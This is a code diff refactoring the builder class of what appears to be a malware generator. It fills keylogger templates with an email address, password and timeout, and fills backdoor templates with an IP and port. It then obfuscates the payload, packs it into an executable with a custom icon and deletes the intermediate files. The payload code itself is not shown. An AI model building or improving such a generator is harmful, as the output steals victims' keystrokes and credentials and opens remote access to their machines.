@@ -14,52 +14,93 @@ class ModuleUtils(Utils):
         """
         super().__init__()
         
-    def pipeline_a(self, module : str, payload : str, mail : str, password : str, timeout : int, name : str, icon_path : str) -> None:
+    def pipeline(self, **kwargs) -> None:
         """
-        Initiates the pipeline process. This includes generating the payload, obfuscating it, converting it to an executable,
-        and performing final cleanup steps.
-        
+        Executes the full pipeline for generating, obfuscating, converting to executable, and finalizing the payload.
+
         Args:
-            module (str): The name of the module to use.
-            payload (str): The name of the payload file to use.
-            mail (str): User's email address.
-            password (str): User's password.
-            timeout (int): Timeout duration.
-            name (str): The name of the file to create.
-            icon_path (str): Path to the icon file to use.
-        """
-        self.generate(payload=payload, module=module, mail=mail, password=password, timeout=timeout, name=name)
-        self.obfuscate(name=name)
-        self.convert_to_exe(module=module, name=name, icon_path=icon_path)
-        self.final(name=name, module=module)
+            kwargs: A dictionary of arguments containing the necessary parameters.
+                Required keys for modules:
+                    Keylogger:
+                        - name (str): The name of the output file.
+                        - module (str): The module name.
+                        - icon_path (str): The path to the icon file for the executable.
+                        - payload (str): The payload file name.
+                        - mail (str): User email for payload replacement.
+                        - password (str): User password for payload replacement.
+                        - timeout (int): Timeout value for payload replacement.
+                    
+                    Backdoor:
+                        - name (str): The name of the output file.
+                        - module (str): The module name.
+                        - icon_path (str): The path to the icon file for the executable.
+                        - payload (str): The payload file name.
+                        - ip (str): User IP for payload replacement (required for module_num 5).
+                        - port (int): User port for payload replacement (required for module_num 5).
         
-    def generate(self, payload: str, module: str, mail: str, password: str, timeout: int, name: str) -> None:
+        Raises:
+            IndexError: If an invalid module number is provided.
         """
-        Generates the payload file and inserts the provided information.
+        self.generate(kwargs=kwargs)
+        self.obfuscate(name=kwargs.get("name"))
+        self.convert_to_exe(module=kwargs.get("module"), name=kwargs.get("name"), icon_path=kwargs.get("icon_path"))
+        self.final(name=kwargs.get("name"), module=kwargs.get("module"))
         
+    def generate(self, kwargs) -> None:
+        """
+        Generates the payload file by replacing placeholders in the template payload with actual values.
+
         Args:
-            payload (str): The name of the payload file to use.
-            module (str): The name of the module to use.
-            mail (str): User's email address.
-            password (str): User's password.
-            timeout (int): Timeout duration.
-            name (str): The name of the file to create.
+            kwargs: A dictionary of arguments containing the necessary parameters.
+                Required keys for modules:
+                    Keylogger:
+                        - name (str): The name of the output file.
+                        - module (str): The module name.
+                        - icon_path (str): The path to the icon file for the executable.
+                        - payload (str): The payload file name.
+                        - mail (str): User email for payload replacement.
+                        - password (str): User password for payload replacement.
+                        - timeout (int): Timeout value for payload replacement.
+                    
+                    Backdoor:
+                        - name (str): The name of the output file.
+                        - module (str): The module name.
+                        - icon_path (str): The path to the icon file for the executable.
+                        - payload (str): The payload file name.
+                        - ip (str): User IP for payload replacement (required for module_num 5).
+                        - port (int): User port for payload replacement (required for module_num 5).
+        
+        Raises:
+            IndexError: If an invalid module number is provided.
         """
         self.clear()
         if OS == "windows":
-            payload_path: str = f"packages\\payloads\\{module}\\{payload}"
+            payload_path: str = f"packages\\payloads\\{kwargs["module"]}\\{kwargs["payload"]}"
         else:
-            payload_path: str = f"./packages/payloads/{module}/{payload}"
+            payload_path: str = f"./packages/payloads/{kwargs["module"]}/{kwargs["payload"]}"
 
         payload_location = os.path.abspath(os.path.join(os.getcwd(), payload_path))
-
-        with open(name, "w", encoding="utf-8") as file:
-            with open(payload_location, 'r', encoding='utf-8') as file1:
-                file_content = file1.read()
-                file_content = file_content.replace("userMail_", mail)
-                file_content = file_content.replace("userPassword_", password)
-                file_content = file_content.replace("timeOut_", str(timeout))
-                file.write(file_content)
+        
+        match kwargs["module"]:
+            case "keylogger":
+                with open(kwargs["name"], "w", encoding="utf-8") as file:
+                    with open(payload_location, 'r', encoding='utf-8') as file1:
+                        file_content = file1.read()
+                        file_content = file_content.replace("userMail_", kwargs["mail"])
+                        file_content = file_content.replace("userPassword_", kwargs["password"])
+                        file_content = file_content.replace("timeOut_", str(kwargs["timeout"]))
+                        file.write(file_content)
+                        
+            case "backdoor":
+                with open(kwargs["name"], "w", encoding="utf-8") as file:
+                    with open(payload_location, 'r', encoding='utf-8') as file1:
+                        file_content = file1.read()
+                        file_content = file_content.replace("userIP_", kwargs["ip"])
+                        file_content = file_content.replace("userPort_", str(kwargs["port"]))
+                        file.write(file_content)
+                        
+            case _:
+                raise ValueError(self.write(message="Invalid Module", level=4))
 
     def obfuscate(self, name : str) -> None:
         """
@@ -101,7 +142,7 @@ class ModuleUtils(Utils):
                     self.write(f"ERROR: {str(e)}", type=4)
                     
             case _:
-                self.write("Invalid module.", level=4)
+                raise ValueError(self.write("Invalid module.", level=4))
         
     def final(self, name : str, module : str) -> None:
         """
@@ -114,6 +155,7 @@ class ModuleUtils(Utils):
         if OS == "windows":
             os.remove(name)
             os.remove(f"dist\\{name}")
+            
         else:
             os.remove(name)
             os.remove(f"dist/{name}")
@@ -152,7 +194,9 @@ class ModuleUtils(Utils):
             print(f"\t    ║ [{i}] {COLOR['RESET']}{payload}{COLOR['CYAN']} {' ' * (68 - len(payload))}║")
 
         print("\t    ╚══════════════════════════════════════════════════════════════════════════╝")
+        
         chc = input("\nPress [Enter] To Continue.  ")
+        
         if chc == "":
             self.run()
             
